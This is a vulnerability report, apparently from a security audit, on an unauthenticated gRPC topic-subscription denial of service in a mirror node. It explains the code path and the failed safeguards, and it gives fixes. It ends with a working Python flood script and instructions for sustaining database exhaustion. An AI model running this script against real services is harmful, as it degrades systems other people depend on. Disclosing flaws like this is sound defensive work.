### Title
Unbounded Historical Scan DoS via Unauthenticated gRPC Topic Subscriptions with startTime=0 and No Limit

### Summary
Any unauthenticated client can open an arbitrary number of gRPC connections to `subscribeTopic()`, each with `startTime=0` and `limit=0`, causing `topicMessageRetriever.retrieve(filter, true)` to continuously page through the entire historical `topic_message` table for each subscription. There is no global subscriber cap, no per-IP rate limit, and no authentication requirement, so an attacker can multiply concurrent DB-scanning subscriptions across many connections to exhaust database I/O and cause a non-network DoS.

### Finding Description

**Code path:**

In `subscribeTopic()` (line 63), the historical retriever is invoked unconditionally before any subscriber cap check:

```java
Flux<TopicMessage> historical = topicMessageRetriever.retrieve(filter, true);
``` [1](#0-0) 

`TopicMessageFilter` permits `startTime=0` via `@Min(0)` and `isValidStartTime()` only checks `startTime <= DomainUtils.now()` — epoch 0 always satisfies this. `limit=0` is also valid; `hasLimit()` returns `false` when `limit == 0`. [2](#0-1) 

In `PollingTopicMessageRetriever.retrieve()` with `throttled=true`, the context sets `numRepeats = Long.MAX_VALUE` and `maxPageSize = 1000`, polling every 2 seconds. The `isComplete()` check for throttled mode only terminates when a page returns fewer than `maxPageSize` results or the limit is hit — with no limit and `startTime=0`, it pages through the entire historical table until the 60-second timeout fires. [3](#0-2) 

**Why existing checks fail:**

- `subscriberCount` (line 48) is a **metric gauge only** — it is never compared against a maximum; no subscription is ever rejected based on it. [4](#0-3) 

- `maxConcurrentCallsPerConnection = 5` limits calls **per TCP connection**, not globally. An attacker opens N connections to get 5N concurrent subscriptions. [5](#0-4) 

- The 60-second `timeout` in `RetrieverProperties` terminates each individual retrieve after 60 seconds, but the attacker simply re-subscribes immediately, maintaining sustained DB load. There is no cooldown or backoff imposed on the client. [6](#0-5) 

- No authentication or authorization is required to call `subscribeTopic()`.

### Impact Explanation

Each subscription with `startTime=0` and no limit issues repeated paginated queries (`SELECT ... WHERE consensus_timestamp >= 0 AND topic_id = X LIMIT 1000`) against the `topic_message` table every 2 seconds for up to 60 seconds. With N connections × 5 subscriptions each, the DB receives `5N` concurrent full-history scans simultaneously. On a production node with years of topic history, this saturates DB I/O, degrades or halts message ingestion and all other mirror node API services, constituting a complete non-network DoS. No privileged access is required.

### Likelihood Explanation

The gRPC endpoint is publicly reachable. The attack requires only a gRPC client library and knowledge of any valid topic ID (topic IDs are public on-chain). Opening hundreds of connections is trivial from a single machine or a small botnet. The attack is repeatable indefinitely since subscriptions auto-expire after 60 seconds and can be immediately re-opened. No exploit code beyond a standard gRPC client is needed.

### Recommendation

1. **Enforce a global subscriber cap**: Compare `subscriberCount` against a configurable maximum in `subscribeTopic()` and reject new subscriptions with `RESOURCE_EXHAUSTED` when the cap is reached.
2. **Enforce a minimum `startTime`**: Reject or clamp `startTime` values older than a configurable lookback window (e.g., 7 days) to bound the historical scan range.
3. **Require a minimum `limit` or cap scan depth**: Reject subscriptions with `limit=0` that also have a `startTime` far in the past, or enforce a maximum number of pages per subscription.
4. **Per-IP connection rate limiting**: Limit the rate at which new connections/subscriptions can be opened from a single source IP at the Netty/load-balancer layer.
5. **Require authentication**: Gate `subscribeTopic()` behind at minimum an API key or mTLS to raise the cost of the attack.

### Proof of Concept

```python
import grpc
import threading
from proto import consensus_service_pb2_grpc, consensus_service_pb2, timestamp_pb2

def flood_subscribe(target, topic_num, n_connections=100):
    threads = []
    for _ in range(n_connections):
        def run():
            channel = grpc.insecure_channel(target)
            stub = consensus_service_pb2_grpc.ConsensusServiceStub(channel)
            req = consensus_service_pb2.ConsensusTopicQuery(
                topic_id=...,          # any valid topic ID
                consensus_start_time=timestamp_pb2.Timestamp(seconds=0, nanos=0),
                # limit intentionally omitted (defaults to 0 = no limit)
            )
            # Open 5 concurrent streams per connection
            for _ in range(5):
                threading.Thread(target=lambda: list(stub.subscribeTopic(req))).start()
        t = threading.Thread(target=run)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()

# Run: flood_subscribe("mirror-node-grpc:5600", topic_num=1, n_connections=200)
# Result: 1000 concurrent DB scans from epoch 0, exhausting DB I/O within seconds.
# Re-run every 55 seconds to maintain sustained load before the 60s timeout fires.
```
